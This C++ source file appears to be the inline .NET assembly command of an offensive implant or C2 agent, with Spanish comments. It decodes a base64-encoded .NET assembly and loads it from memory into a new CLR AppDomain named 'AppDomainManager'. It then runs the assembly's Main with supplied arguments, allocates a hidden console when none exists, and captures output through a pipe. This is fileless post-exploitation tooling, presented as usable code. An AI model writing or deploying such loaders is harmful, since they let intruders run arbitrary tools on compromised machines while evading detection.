#include "Commands.h"
#include <metahost.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <sstream>

#pragma comment(lib, "mscoree.lib")
#define PIPE_BUFFER_LENGTH 0x10000

namespace mscorlib {
#include "mscorlib.h"
}

HRESULT DotnetExecute(
    _In_  PBYTE  AssemblyBytes,
    _In_  ULONG  AssemblySize,
    _In_  PWSTR  AppDomainName,
    _In_  PWSTR  Arguments,
    _Out_ LPSTR* OutputBuffer,
    _Out_ PULONG OutputLength
) {
    HRESULT                HResult = S_OK;
    ICLRMetaHost* IMetaHost = nullptr;
    ICLRRuntimeInfo* IRuntimeInfo = nullptr;
    ICorRuntimeHost* IRuntimeHost = nullptr;
    IUnknown* IAppDomainThunk = nullptr;
    mscorlib::_AppDomain* AppDomain = nullptr;
    mscorlib::_Assembly* Assembly = nullptr;
    mscorlib::_MethodInfo* MethodInfo = nullptr;
    SAFEARRAYBOUND         SafeArrayBound = {};
    SAFEARRAY* SafeAssembly = nullptr;
    SAFEARRAY* SafeExpected = nullptr;
    SAFEARRAY* SafeArguments = nullptr;
    PWSTR* AssemblyArgv = nullptr;
    ULONG                  AssemblyArgc = 0;
    LONG                   Index = 0;
    VARIANT                VariantArgv = {};
    BOOL                   IsLoadable = FALSE;
    HWND                   ConExist = nullptr;
    HWND                   ConHandle = nullptr;
    HANDLE                 BackupHandle = nullptr;
    HANDLE                 IoPipeRead = nullptr;
    HANDLE                 IoPipeWrite = nullptr;
    SECURITY_ATTRIBUTES    SecurityAttr = {};

    *OutputBuffer = nullptr;
    *OutputLength = 0;

    // 1. Instanciar el CLR MetaHost
    HResult = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, reinterpret_cast<PVOID*>(&IMetaHost));
    if (FAILED(HResult)) {
        printf("[-] CLRCreateInstance Failed with Error: %lx\n", HResult);
        goto _END_OF_FUNC;
    }

    // 2. Obtener la versión del Runtime v4
    HResult = IMetaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, reinterpret_cast<PVOID*>(&IRuntimeInfo));
    if (FAILED(HResult)) {
        printf("[-] IMetaHost->GetRuntime Failed with Error: %lx\n", HResult);
        goto _END_OF_FUNC;
    }

    // 3. Verificar si es cargable en este proceso
    HResult = IRuntimeInfo->IsLoadable(&IsLoadable);
    if (FAILED(HResult) || !IsLoadable) {
        printf("[-] IRuntimeInfo->IsLoadable Failed or not loadable. Error: %lx\n", HResult);
        goto _END_OF_FUNC;
    }

    // 4. Obtener interfaz del Host
    HResult = IRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, reinterpret_cast<PVOID*>(&IRuntimeHost));
    if (FAILED(HResult)) {
        printf("[-] IRuntimeInfo->GetInterface Failed with Error: %lx\n", HResult);
        goto _END_OF_FUNC;
    }

    // 5. Iniciar el CLR
    HResult = IRuntimeHost->Start();
    if (FAILED(HResult)) {
        printf("[-] IRuntimeHost->Start Failed with Error: %lx\n", HResult);
        goto _END_OF_FUNC;
    }

    // 6. Crear un nuevo AppDomain independiente
    HResult = IRuntimeHost->CreateDomain(AppDomainName, nullptr, &IAppDomainThunk);
    if (FAILED(HResult)) {
        printf("[-] IRuntimeHost->CreateDomain Failed with Error: %lx\n", HResult);
        goto _END_OF_FUNC;
    }

    // 7. Resolver interfaz del AppDomain
    HResult = IAppDomainThunk->QueryInterface(IID_PPV_ARGS(&AppDomain));
    if (FAILED(HResult)) {
        printf("[-] IAppDomainThunk->QueryInterface Failed with Error: %lx\n", HResult);
        goto _END_OF_FUNC;
    }

    // 8. Preparar el SafeArray con los bytes del ensamblado .NET
    SafeArrayBound = { AssemblySize, 0 };
    SafeAssembly = SafeArrayCreate(VT_UI1, 1, &SafeArrayBound);
    if (!SafeAssembly) {
        HResult = E_OUTOFMEMORY;
        goto _END_OF_FUNC;
    }
    memcpy(SafeAssembly->pvData, AssemblyBytes, AssemblySize);

    // 9. Cargar el ensamblado en el AppDomain
    HResult = AppDomain->Load_3(SafeAssembly, &Assembly);
    if (FAILED(HResult)) {
        printf("[-] AppDomain->Load_3 Failed with Error: %lx\n", HResult);
        goto _END_OF_FUNC;
    }

    // 10. Obtener el EntryPoint (Main)
    HResult = Assembly->get_EntryPoint(&MethodInfo);
    if (FAILED(HResult)) {
        printf("[-] Assembly->get_EntryPoint Failed with Error: %lx\n", HResult);
        goto _END_OF_FUNC;
    }

    // 11. Validar parámetros del método
    HResult = MethodInfo->GetParameters(&SafeExpected);
    if (FAILED(HResult)) {
        printf("[-] MethodInfo->GetParameters Failed with Error: %lx\n", HResult);
        goto _END_OF_FUNC;
    }

    // 12. Construcción de los argumentos de entrada para el Main
    if (SafeExpected && SafeExpected->cDims && SafeExpected->rgsabound[0].cElements) {
        SafeArguments = SafeArrayCreateVector(VT_VARIANT, 0, 1);
        if (Arguments && wcslen(Arguments) > 0) {
            AssemblyArgv = CommandLineToArgvW(Arguments, reinterpret_cast<PINT>(&AssemblyArgc));
        }

        VariantArgv.vt = (VT_ARRAY | VT_BSTR);
        VariantArgv.parray = SafeArrayCreateVector(VT_BSTR, 0, AssemblyArgc);

        for (Index = 0; Index < static_cast<LONG>(AssemblyArgc); Index++) {
            // SOLUCIÓN 1: Llaves para aislar el scope de bstrArg
            {
                BSTR bstrArg = SysAllocString(AssemblyArgv[Index]);
                SafeArrayPutElement(VariantArgv.parray, &Index, bstrArg);
                SysFreeString(bstrArg);
            }
        }

        Index = 0;
        SafeArrayPutElement(SafeArguments, &Index, &VariantArgv);
        SafeArrayDestroy(VariantArgv.parray);
        VariantArgv.parray = nullptr;
    }

    // 13. Configurar redirección de salida mediante Pipes anónimos
    SecurityAttr = { sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };
    if (!CreatePipe(&IoPipeRead, &IoPipeWrite, &SecurityAttr, PIPE_BUFFER_LENGTH)) {
        HResult = HRESULT_FROM_WIN32(GetLastError());
        printf("[-] CreatePipe Failed with Error: %lx\n", HResult);
        goto _END_OF_FUNC;
    }

    if (!(ConExist = GetConsoleWindow())) {
        AllocConsole();
        if ((ConHandle = GetConsoleWindow())) {
            ShowWindow(ConHandle, SW_HIDE);
        }
    }

    BackupHandle = GetStdHandle(STD_OUTPUT_HANDLE);
    SetStdHandle(STD_OUTPUT_HANDLE, IoPipeWrite);

    // 14. Ejecutar el ensamblado
    // SOLUCIÓN 1: Llaves para aislar el scope de vtRet
    {
        VARIANT vtRet = {};
        HResult = MethodInfo->Invoke_3(vtRet, SafeArguments, nullptr);
        if (FAILED(HResult)) {
            printf("[-] MethodInfo->Invoke_3 Failed with Error: %lx\n", HResult);
        }
    }

    // 15. Restaurar el manejador de salida estándar de inmediato
    if (BackupHandle) {
        SetStdHandle(STD_OUTPUT_HANDLE, BackupHandle);
        BackupHandle = nullptr;
    }

    // Cerrar el extremo de escritura para que ReadFile detecte el EOF y salga del bucle
    if (IoPipeWrite) {
        CloseHandle(IoPipeWrite);
        IoPipeWrite = nullptr;
    }

    // 16. Leer la salida generada
    *OutputBuffer = static_cast<LPSTR>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, PIPE_BUFFER_LENGTH));
    if (*OutputBuffer) {
        // SOLUCIÓN 1: Llaves para aislar el scope de bytesRead
        {
            DWORD bytesRead = 0;
            if (!ReadFile(IoPipeRead, *OutputBuffer, PIPE_BUFFER_LENGTH - 1, &bytesRead, nullptr)) {
                printf("[-] ReadFile Failed with Error: %lx\n", GetLastError());
            }
            *OutputLength = bytesRead;
        }
    }
    else {
        HResult = E_OUTOFMEMORY;
    }

_END_OF_FUNC:
    if (BackupHandle) {
        SetStdHandle(STD_OUTPUT_HANDLE, BackupHandle);
    }
    if (IoPipeWrite) CloseHandle(IoPipeWrite);
    if (IoPipeRead)  CloseHandle(IoPipeRead);

    if (AssemblyArgv) LocalFree(AssemblyArgv);

    if (SafeAssembly)  SafeArrayDestroy(SafeAssembly);
    if (SafeArguments) SafeArrayDestroy(SafeArguments);
    if (SafeExpected)  SafeArrayDestroy(SafeExpected);

    if (MethodInfo)       MethodInfo->Release();
    if (Assembly)         Assembly->Release();
    if (AppDomain)        AppDomain->Release();
    if (IAppDomainThunk)  IAppDomainThunk->Release();
    if (IRuntimeHost)     IRuntimeHost->Release();
    if (IRuntimeInfo)     IRuntimeInfo->Release();
    if (IMetaHost)        IMetaHost->Release();

    return HResult;
}

PWSTR create_commandline_w(const std::vector<std::string>& arguments) {
    if (arguments.empty()) return nullptr;

    std::ostringstream oss;
    for (size_t i = 0; i < arguments.size(); ++i) {
        if (i > 0) oss << " ";
        oss << arguments[i];
    }
    std::string cmdStr = oss.str();

    int size_needed = MultiByteToWideChar(CP_UTF8, 0, cmdStr.c_str(), static_cast<int>(cmdStr.size()), NULL, 0);
    wchar_t* cmdline = new wchar_t[size_needed + 1];
    MultiByteToWideChar(CP_UTF8, 0, cmdStr.c_str(), static_cast<int>(cmdStr.size()), cmdline, size_needed);
    cmdline[size_needed] = L'\0';

    return reinterpret_cast<PWSTR>(cmdline);
}

std::string InlineAssembly(std::vector<std::string> arguments, const std::string& file_data) {
    if (file_data.empty())
        return "Error: no assembly data";

    std::string assembly = base64_decode(file_data);
    if (assembly.empty())
        return "Error: failed to decode assembly";

    LPSTR outputBuff = nullptr;
    ULONG outputLen = 0;
    PWSTR appDomainManager = const_cast<PWSTR>(L"AppDomainManager");

    PWSTR argumentsW = create_commandline_w(arguments);

    HRESULT hr = DotnetExecute(
        reinterpret_cast<PBYTE>(const_cast<char*>(assembly.data())),
        static_cast<ULONG>(assembly.size()),
        appDomainManager,
        argumentsW,
        &outputBuff,
        &outputLen
    );

    if (argumentsW) {
        delete[] argumentsW;
    }

    if (FAILED(hr)) {
        if (outputBuff) HeapFree(GetProcessHeap(), 0, outputBuff);
        return "Error: DotnetExecute failed with HRESULT " + std::to_string(hr);
    }

    std::string output;
    if (outputBuff && outputLen > 0) {
        output = std::string(outputBuff, outputLen);
    }

    if (outputBuff) {
        HeapFree(GetProcessHeap(), 0, outputBuff);
    }

    return output;
}